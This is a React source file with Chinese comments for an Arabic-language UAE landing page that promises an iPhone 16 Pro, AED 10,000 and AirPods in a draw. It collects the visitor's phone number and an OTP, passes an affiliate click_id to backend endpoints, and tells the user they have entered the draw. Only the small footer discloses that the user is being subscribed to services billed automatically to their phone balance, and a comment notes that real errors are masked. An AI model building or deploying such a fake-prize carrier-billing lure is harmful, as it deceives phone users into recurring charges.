import { useState, useEffect } from "react";

export default function Home() {
  const [clickId, setClickId] = useState("");
  const [msisdn, setMsisdn] = useState("");
  const [otp, setOtp] = useState("");
  const [txid, setTxid] = useState("");
  const [message, setMessage] = useState("");
  const [step, setStep] = useState(1); // 步骤追踪：1为输入手机号，2为输入OTP，3为成功
  const [loading, setLoading] = useState(false);

  // 加载时自动捕获 Voluum 的 click_id
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("cid")) setClickId(params.get("cid"));
  }, []);

  // 1. 请求验证码 (Request PIN)
  async function requestPIN() {
    if (!msisdn) {
      setMessage("يرجى إدخال رقم الهاتف"); // 请输入手机号
      return;
    }
    
    setLoading(true);
    setMessage("جاري إرسال الرمز...");

    // 自动清洗号码：如果用户自己输入了 971，就不用管；如果没输入，自动在前面补上 971
    let cleanMsisdn = msisdn.trim();
    if (!cleanMsisdn.startsWith("971")) {
      cleanMsisdn = "971" + cleanMsisdn;
    }

    try {
      // 路径修改为匹配我们之前建立的 api/request.js
      const response = await fetch("/api/request", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ msisdn: cleanMsisdn, click_id: clickId })
      });

      const data = await response.json();

      if (data.success) {
        setTxid(data.txid);
        setStep(2); // 丝滑跳转到输入验证码的一步
        setMessage("✅ تم إرسال رمز التحقق إلى هاتفك");
      } else {
        // 隐藏技术错误，统一显示官方提示
        setMessage("❌ عذراً، هذا الرقم غير مؤهل حالياً. يرجى التأكد من أنه رقم اتصالات فعال.");
      }
    } catch (error) {
      setMessage("❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً");
    }
    setLoading(false);
  }

  // 2. 验证并回传转化 (Verify PIN)
  async function verifyPIN() {
    if (!otp) {
      setMessage("يرجى إدخال رمز OTP");
      return;
    }

    setLoading(true);
    setMessage("جاري التحقق من الرمز...");

    try {
      // 路径修改为匹配我们之前建立的 api/verify.js
      const response = await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ txid, pin: otp, click_id: clickId })
      });

      const data = await response.json();

      if (data.success) {
        setStep(3); // 跳转到订阅成功界面
        setMessage("");
      } else {
        setMessage("❌ الرمز غير صحيح، حاول مرة أخرى");
      }
    } catch (error) {
      setMessage("❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً");
    }
    setLoading(false);
  }

  return (
    <div style={styles.body}>
      <div style={styles.badge}>🇦🇪 عرض حصري للإمارات</div>

      <h1 style={styles.title}>اربح آيفون 16 برو</h1>
      <p style={styles.subtitle}>أدخل رقم هاتفك الآن للدخول في السحب والفوز بجوائز حصرية</p>

      <div style={styles.gift}>🎁</div>

      {/* 奖品卡片展示区 */}
      <div style={styles.cards}>
        <div style={styles.card}>
          <img src="https://i.ibb.co/B5tGx9x2/iphone-16.png" style={styles.image} />
          <h3>iPhone 16 Pro</h3>
        </div>
        <div style={styles.card}>
          <img src="https://i.ibb.co/S7WWWXJN/cash.png" style={styles.image} />
          <h3>AED 10,000</h3>
        </div>
        <div style={styles.card}>
          <img src="https://i.ibb.co/XZbtrpsJ/111851-sp880-airpods-Pro-2nd-gen.png" style={styles.image} />
          <h3>AirPods Pro</h3>
        </div>
      </div>

      {/* 表单交互核心框 */}
      <div style={styles.formBox}>
        {step === 1 && (
          <div>
            <h2 style={styles.formTitle}>أدخل رقم هاتفك</h2>
            <div style={styles.phoneBox}>
              <input
                type="text"
                placeholder="54XXXXXXXX"
                value={msisdn}
                onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ""))}
                style={styles.input}
              />
              <div style={styles.country}>+971</div>
            </div>
            <button onClick={requestPIN} disabled={loading} style={styles.yellowButton}>
              {loading ? "جاري الطلب..." : "اشترك الآن"}
            </button>
          </div>
        )}

        {step === 2 && (
          <div>
            <h2 style={styles.formTitle} style={{...styles.formTitle, color: '#2ecc71'}}>أدخل رمز التأكيد</h2>
            <input
              type="text"
              placeholder="أدخل رمز OTP"
              value={otp}
              maxLength={4}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              style={styles.otpInput}
            />
            <button onClick={verifyPIN} disabled={loading} style={styles.greenButton}>
              {loading ? "جاري التأكيد..." : "تأكيد الرمز"}
            </button>
          </div>
        )}

        {step === 3 && (
          <div style={{ padding: "20px 0" }}>
            <h2 style={{ color: "#2ecc71", fontSize: "50px", marginBottom: "20px" }}>🎉 تم الاشتراك بنجاح! 🎉</h2>
            <p style={{ fontSize: "24px", color: "#333", lineHeight: "1.6" }}>لقد دخلت السحب الرسمي بنجاح.<br />سيتم التواصل معك قريباً في حال فوزك!</p>
          </div>
        )}

        {/* 动态通知消息 */}
        <div style={styles.message}>{message}</div>

        <div style={styles.footer}>
          ⚡ عدد الفائزين محدود يومياً
          <br /><br />
          بالمتابعة فإنك توافق على الاشتراك في الخدمات الترويجية. سيتم خصم رسوم الاشتراك تلقائياً من رصيدك.
        </div>
      </div>
    </div>
  );
}

// 完美的华丽视觉样式保持不变
const styles = {
  body: {
    background: "linear-gradient(to bottom, #7b00b6, #3d0066)",
    minHeight: "100vh",
    padding: "20px",
    textAlign: "center",
    color: "white",
    fontFamily: "Arial",
    direction: "rtl"
  },
  badge: {
    background: "#ffd500",
    color: "#000",
    display: "inline-block",
    padding: "14px 40px",
    borderRadius: "40px",
    fontWeight: "bold",
    fontSize: "22px",
    marginTop: "20px"
  },
  title: {
    fontSize: "60px",
    marginTop: "40px",
    fontWeight: "900"
  },
  subtitle: {
    fontSize: "26px",
    marginTop: "20px",
    lineHeight: "1.5",
    padding: "0 10px"
  },
  gift: {
    fontSize: "90px",
    margin: "20px 0"
  },
  cards: {
    display: "flex",
    justifyContent: "center",
    gap: "20px",
    flexWrap: "wrap",
    marginBottom: "40px"
  },
  card: {
    width: "220px",
    background: "#8d2be2",
    border: "4px solid #ffd500",
    borderRadius: "30px",
    padding: "20px",
    color: "white"
  },
  image: {
    width: "130px",
    height: "130px",
    objectFit: "contain"
  },
  formBox: {
    background: "#efefef",
    color: "black",
    borderRadius: "40px",
    padding: "40px 20px",
    maxWidth: "600px",
    margin: "auto",
    boxShadow: "0 10px 25px rgba(0,0,0,0.3)"
  },
  formTitle: {
    color: "#7b2be2",
    fontSize: "42px",
    marginBottom: "30px"
  },
  phoneBox: {
    display: "flex",
    flexDirection: "row",
    border: "6px solid #cfd1d8",
    borderRadius: "30px",
    overflow: "hidden",
    background: "white",
    height: "90px",
    direction: "ltr"
  },
  input: {
    flex: 1,
    border: "none",
    fontSize: "36px",
    textAlign: "center",
    fontWeight: "bold",
    outline: "none"
  },
  country: {
    width: "140px",
    background: "#d9d9df",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontSize: "34px",
    fontWeight: "bold"
  },
  yellowButton: {
    width: "100%",
    height: "90px",
    border: "none",
    borderRadius: "30px",
    marginTop: "30px",
    background: "#ffd500",
    color: "black",
    fontSize: "40px",
    fontWeight: "bold",
    cursor: "pointer",
    boxShadow: "0 4px 10px rgba(255,213,0,0.4)"
  },
  otpInput: {
    width: "100%",
    height: "90px",
    borderRadius: "30px",
    border: "6px solid #cfd1d8",
    fontSize: "32px",
    textAlign: "center",
    marginTop: "10px",
    fontWeight: "bold"
  },
  greenButton: {
    width: "100%",
    height: "90px",
    border: "none",
    borderRadius: "30px",
    marginTop: "30px",
    background: "#2ecc71",
    color: "white",
    fontSize: "38px",
    fontWeight: "bold",
    cursor: "pointer",
    boxShadow: "0 4px 10px rgba(46,204,113,0.4)"
  },
  message: {
    marginTop: "25px",
    color: "#e74c3c",
    fontSize: "24px",
    fontWeight: "bold"
  },
  footer: {
    marginTop: "40px",
    fontSize: "16px",
    lineHeight: "1.6",
    color: "#666",
    padding: "0 10px"
  }
};